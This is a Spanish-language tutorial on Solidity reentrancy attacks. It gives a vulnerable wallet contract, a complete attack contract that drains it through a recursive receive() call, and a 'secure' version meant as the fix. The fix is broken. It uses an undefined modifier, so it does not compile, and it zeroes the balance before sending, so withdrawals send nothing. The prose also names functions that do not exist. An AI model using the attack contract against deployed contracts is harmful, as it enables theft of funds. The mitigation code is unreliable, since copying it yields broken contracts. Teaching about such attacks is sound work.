# Solidity_Attacks

### Reentrancy Attack  

Para comprender mejor el ataque de reentrancia, primero debemos entender el funcionamiento de las funciones y las transacciones en Solidity. Cuando se llama a una función en un contrato inteligente, se inicia una nueva transacción en la red de Ethereum. Durante esta transacción, el contrato inteligente realiza ciertas operaciones y puede llamar a otras funciones o enviar Ether a otros contratos o direcciones. Cuando se llama a una función en un contrato inteligente, cualquier código adicional que se ejecute dentro de esa función se ejecuta en el mismo contexto de la transacción original.

Ahora, para entender mejor cómo funciona un ataque de reentrancia, imaginemos que un contrato inteligente tiene una función que permite a los usuarios retirar Ether de su cuenta en el contrato. Esta función, digamos "retirar()", realiza una serie de operaciones, como verificar el saldo de la cuenta del usuario, actualizar el saldo y enviar Ether a la dirección del usuario. Ahora, si un atacante malintencionado crea un contrato que llama a la función "retirar()" del contrato inteligente, pero luego vuelve a llamar a "retirar()" antes de que la transacción original se haya completado, el contrato malintencionado puede seguir retirando Ether del contrato inteligente de manera repetitiva, aprovechando el hecho de que la función "retirar()" aún no ha terminado de ejecutarse.

Para ilustrar esto con un ejemplo de código, aquí hay un contrato inteligente de ejemplo llamado "WalletInsegura.sol", que contiene una función "retirar()" vulnerable al ataque de reentrancia:


**WalletInsegura.sol**

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract WalletInsegura {
    mapping (address => uint256) private balances;

    function balance() external view returns (uint256) {
        return address(this).balance;
    }

    function depositar() external payable {
        balances[msg.sender] += msg.value;
    }

    function retirar() external {
        require(balances[msg.sender] > 0, "Insufficient balance");

        (bool success, ) = payable(msg.sender).call{value: balances[msg.sender]}("");
        require(success, "Error al enviar eth");

        balances[msg.sender] = 0;
    }
}
```

En este contrato, los usuarios pueden depositar Ether en su cuenta en el contrato llamando a la función "deposit()", que simplemente actualiza el saldo del usuario en el mapa "balances". Sin embargo, la función "retirar()" es vulnerable a un ataque de reentrancia. Si un atacante malintencionado crea un contrato que llama repetidamente a "retirar()", como se muestra a continuación, el contrato puede retirar Ether del contrato inteligente de manera repetitiva hasta que se quede sin fondos.

Ahora, crearemos un contrato malintencionado llamado "Ataque.sol" para explotar la vulnerabilidad en el contrato "WalletInsegura.sol". El código para el contrato malintencionado:


**Ataque.sol**  

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface IWallet {
    function depositar() external payable;
    function retirar() external;
}

contract Ataque {
    IWallet public immutable wallet;

    constructor(IWallet _wallet) {
        wallet = _wallet;
    }

    function atacar() external payable {
        require(msg.value == 1 ether, "Insuficiente eth");
        wallet.depositar{value: 1 ether}();
        wallet.retirar();
    }
    
    receive() external payable {
        if (address(wallet).balance >= 1 ether)
            wallet.retirar();
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

Este contrato malintencionado tiene una función llamada "ataque()" que corrobora que el atacante tenga ether y llama a la función "depositar()" ya que la función "retirar()" requiere que este tenga balance y luego llama a la función "retirar()" nuevamente antes de que se actualice el balance en el contrato vulnerable. 

Finalmente, el contrato malintencionado también tiene una función de fallback que se activa cuando se envía Ether al contrato sin especificar una función. Esta función comprueba el saldo del contrato "WalletInsegura.sol" y llama a la función "retirar()" si hay suficiente saldo disponible. Esto se repite hasta que el contrato malintencionado agota los fondos del contrato "WalletInsegura.sol".


Para protegerse contra el ataque de reentrancia, los desarrolladores deben asegurarse de que las funciones críticas del contrato inteligente estén diseñadas para evitar llamadas repetitivas o llamadas a otras funciones que puedan ser explotadas por un atacante malintencionado. Una forma común de hacerlo es usar el patrón de bloqueo de estado, que bloquea el estado del contrato inteligente durante la ejecución de una función para evitar que otras funciones se llamen antes de que la transacción original se complete.

Aquí está el código completo del contrato seguro "WalletSegura.sol" que utiliza el patrón de bloqueo de estado:


**WalletSegura.sol**
```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract WalletSegura {
    bool internal bloqueado;
    mapping (address => uint256) private balances;

    function balance() external view returns (uint256) {
        return address(this).balance;
    }

    function depositar() external payable {
        balances[msg.sender] += msg.value;
    }

    function retirar() external noReentrada{
        require(balances[msg.sender] > 0, "Insufficient balance");
        balances[msg.sender] = 0;
        (bool success, ) = payable(msg.sender).call{value: balances[msg.sender]}("");
        require(success, "Error al enviar eth");
    }

    modifier proteger() {
        require(!bloqueado, "Llamada de ataque");
        bloqueado = true;
        _;
        bloqueado = false;
    }
}
```

En este contrato, se ha agregado una variable booleana "bloqueado" para evitar que las funciones se llamen repetitivamente. La función "retirar()" ahora tiene un modificador personalizado "noReentrada()" que bloquea la función "retirar()" si ya está en ejecución. El modificador establece la variable "bloqueado" en verdadero al inicio de la ejecución de la función y la establece en falso al finalizar. Esto garantiza que la función "retirar()" no se llame repetidamente hasta que se complete la transacción original.


